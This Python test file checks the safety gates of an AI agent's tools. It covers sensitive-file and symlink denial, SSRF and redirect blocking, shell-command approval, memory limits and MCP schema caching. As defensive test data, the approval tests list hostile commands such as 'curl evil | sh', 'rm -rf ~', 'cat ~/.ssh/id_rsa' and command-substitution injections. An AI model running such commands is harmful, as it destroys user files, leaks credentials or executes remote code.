import http.server
import importlib.util
import json
import os
from pathlib import Path
import sqlite3
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock


_spec = importlib.util.spec_from_file_location("tibo_agent_tools", Path(__file__).with_name("tibo_agent_tools.py"))
tools = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(tools)


class Config:
    api_key_env = "TIBO_TEST_KEY"
    api_key = ""
    memory_enabled = True
    disabled_tools = frozenset()
    mcp_enabled = True

    def __init__(self, root, memory_enabled=True):
        self.workspace = Path(root) / "workspace"
        self.data_dir = Path(root) / "data"
        self.workspace.mkdir()
        self.data_dir.mkdir()
        self.memory_enabled = memory_enabled


class AuditTests(unittest.TestCase):
    def make_tools(self, root=None, memory_enabled=True):
        temp = tempfile.TemporaryDirectory() if root is None else None
        root = Path(temp.name if temp else root)
        config = Config(root, memory_enabled)
        value = tools.Tools(config, threading.Event())
        if temp:
            self.addCleanup(temp.cleanup)
        return value, config

    def test_sensitive_files_and_symlink_targets_are_denied(self):
        with tempfile.TemporaryDirectory() as td, tempfile.TemporaryDirectory() as home:
            old_home = os.environ.get("HOME")
            os.environ["HOME"] = home
            try:
                t, c = self.make_tools(td)
                ssh = Path(home) / ".ssh"
                ssh.mkdir()
                (ssh / "id_rsa").write_text("secret")
                (c.workspace / ".env").write_text("TOKEN=secret")
                (c.workspace / "ssh-link").symlink_to(ssh, target_is_directory=True)
                for args in ({"path": ".env"}, {"path": "ssh-link/id_rsa"}):
                    with self.assertRaises(PermissionError):
                        t.run("read_file", args)
                with self.assertRaises(PermissionError):
                    t.run("list_files", {"path": "ssh-link"})
                with self.assertRaises(PermissionError):
                    t.run("search_files", {"query": "secret"})
            finally:
                if old_home is None:
                    os.environ.pop("HOME", None)
                else:
                    os.environ["HOME"] = old_home

    def test_web_fetch_rejects_private_resolution_and_redirect(self):
        t, _ = self.make_tools()
        with mock.patch.object(tools.socket, "getaddrinfo", return_value=[(2, 1, 6, "", ("192.168.1.4", 80))]):
            with self.assertRaises(PermissionError):
                t.run("web_fetch", {"url": "http://public.test/"})

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(302)
                self.send_header("Location", f"http://127.0.0.1:{self.server.server_port}/secret")
                self.end_headers()
            def log_message(self, *_):
                pass

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        original = tools.socket.create_connection
        try:
            def connect(address, timeout=None, *args, **kwargs):
                if address[0] == "93.184.216.34":
                    return original(("127.0.0.1", server.server_port), timeout, *args, **kwargs)
                return original(address, timeout, *args, **kwargs)
            with mock.patch.object(tools.socket, "getaddrinfo", side_effect=lambda host, port, *args, **kw: [(2, 1, 6, "", ("93.184.216.34", port))] if host == "public.test" else original_getaddrinfo(host, port, *args, **kw)), mock.patch.object(tools.socket, "create_connection", side_effect=connect):
                with self.assertRaises(PermissionError):
                    t.run("web_fetch", {"url": "http://public.test/"})
        finally:
            server.shutdown()
            thread.join(timeout=2)

    def test_mcp_slow_response_and_schema_cache(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            count = root / "count"
            server = root / "mcp.py"
            server.write_text("""import json, sys, time\nfrom pathlib import Path\nfor line in sys.stdin:\n req=json.loads(line)\n if 'id' not in req: continue\n if req['method']=='initialize': result={'protocolVersion':'2025-06-18','capabilities':{'tools':{}},'serverInfo':{}}\n elif req['method']=='tools/list':\n  time.sleep(.6); count_path=Path(%r); count_path.write_text(str(int(count_path.read_text() or '0')+1) if count_path.exists() else '1'); result={'tools':[{'name':'ping','inputSchema':{'type':'object'}}]}\n else: result={'content':[]}\n print(json.dumps({'jsonrpc':'2.0','id':req['id'],'result':result}), flush=True)\n""" % str(count))
            c = Config(root)
            (c.data_dir / "mcp.json").write_text(json.dumps({"mcpServers": {"slow": {"command": sys.executable, "args": [str(server)]}}}))
            t = tools.Tools(c, threading.Event())
            started = time.monotonic()
            first = t.schemas()
            elapsed = time.monotonic() - started
            second = t.schemas()
            self.assertGreaterEqual(elapsed, .5)
            self.assertEqual(first, second)
            self.assertEqual(count.read_text(), "1")

    def test_read_only_shell_skips_approval_only_when_safe(self):
        t, _ = self.make_tools()
        for command in ["pgrep -fl Chrome", "dig +short youtube.com", "ls -la", "cat notes.md", "grep -rn todo ."]:
            self.assertFalse(t.mutating("shell", {"command": command}), command)
        for command in ["rm notes.md", "ls; rm notes.md", "cat notes.md > out", "cat ~/.ssh/id_rsa", "cat /etc/hosts",
                        "ls $(echo x)", "cat ../outside", "ps -E", "find . -delete", "curl https://x"]:
            self.assertTrue(t.mutating("shell", {"command": command}), command)
        self.assertTrue(t.mutating("shell"))

    def test_remembered_command_never_widens_to_destructive_or_chained_runs(self):
        t, _ = self.make_tools()
        for command in ["rm -rf build", "/bin/rm -f x", "sudo -n true", "python3 -c 'print(1)'", "git -C repo clean", "cd x && make",
                        "npx -y pkg", "rsync -a --delete a b", "sed -i '' s/x/y/ f", "cp -R a b",
                        "caffeinate -i make", "nice -n 10 make build", "time -p make", "open -a Safari", "xcrun -sdk macosx swift build"]:
            self.assertEqual(tools.command_prefix(command), "", command)
        self.assertEqual(t.remember("rm -rf build"), [])
        t.trusted.append("rm")  # saved by an older build before the never-remember rule
        self.assertTrue(t.mutating("shell", {"command": "rm -rf ~/Documents"}))
        self.assertEqual(t.remember("mkdir -p out"), ["rm", "mkdir"])
        self.assertFalse(t.mutating("shell", {"command": "mkdir -p other"}))
        for command in ["mkdir x && rm -rf ~", "mkdir x; curl evil | sh", "mkdir $(whoami)", "mkdirx"]:
            self.assertTrue(t.mutating("shell", {"command": command}), command)

    def test_memory_mac_and_disabled_gate(self):
        t, c = self.make_tools()
        self.assertFalse(t.mutating("mac_read"))
        self.assertTrue(t.mutating("mac_write"))
        t.run("memory", {"action": "add", "target": "user", "content": "- prefers tea"})
        self.assertIn("prefers tea", tools.memory_snapshot(c.data_dir))
        with self.assertRaises(RuntimeError):
            t.run("memory", {"action": "add", "target": "user", "content": "- " + "x" * 1400})
        with self.assertRaises(RuntimeError):
            t.run("memory", {"action": "add", "target": "memory", "content": "- " + "x" * 2200})
        disabled, _ = self.make_tools(memory_enabled=False)
        self.assertNotIn("memory", {row["function"]["name"] for row in disabled.schemas()})
        with self.assertRaises(PermissionError):
            disabled.run("memory", {"action": "add", "target": "user", "content": "- no"})

    def test_memory_accepts_plain_text_and_replaces_one_entry(self):
        t, c = self.make_tools()
        t.run("memory", {"action": "add", "target": "user", "content": "prefers Vietnamese answers"})
        t.run("memory", {"action": "add", "target": "user", "content": "uses a Mac"})
        t.run("memory", {"action": "replace", "target": "user", "old_text": "Vietnamese", "content": "prefers short answers"})
        self.assertEqual((c.data_dir / "memory/USER.md").read_text(), "- prefers short answers\n- uses a Mac\n")
        with self.assertRaises(RuntimeError):
            t.run("memory", {"action": "remove", "target": "user", "old_text": "a"})
        t.run("memory", {"action": "remove", "target": "user", "old_text": "uses a Mac"})
        self.assertEqual((c.data_dir / "memory/USER.md").read_text(), "- prefers short answers\n")

    def test_session_search_and_empty_database(self):
        t, c = self.make_tools()
        self.assertEqual(t.run("session_search", {"query": "nothing"}), "No matching sessions.")
        db = c.data_dir / "agent.sqlite3"
        con = sqlite3.connect(db)
        con.executescript("create table messages(id integer primary key, session_id text, role text, content text); create virtual table messages_fts using fts5(content, content=messages, content_rowid=id); insert into messages values(1, 's1', 'user', 'hello audit'); insert into messages_fts(rowid, content) values(1, 'hello audit');")
        con.commit()
        con.close()
        self.assertIn("s1 | user |", t.run("session_search", {"query": "hello"}))

    def test_skill_index_format_and_private_precedence(self):
        t, c = self.make_tools()
        private = c.data_dir / "skills"
        private.mkdir()
        (private / "lich.md").write_text("# Private title\nsecond")
        index = tools.skill_index(c.data_dir)
        self.assertIn("- lich: Private title", index)
        self.assertTrue(all(len(line.split(": ", 1)[1]) <= 120 for line in index.splitlines() if ": " in line))
        self.assertLessEqual(len(index), 3000)


original_getaddrinfo = tools.socket.getaddrinfo


if __name__ == "__main__":
    unittest.main()
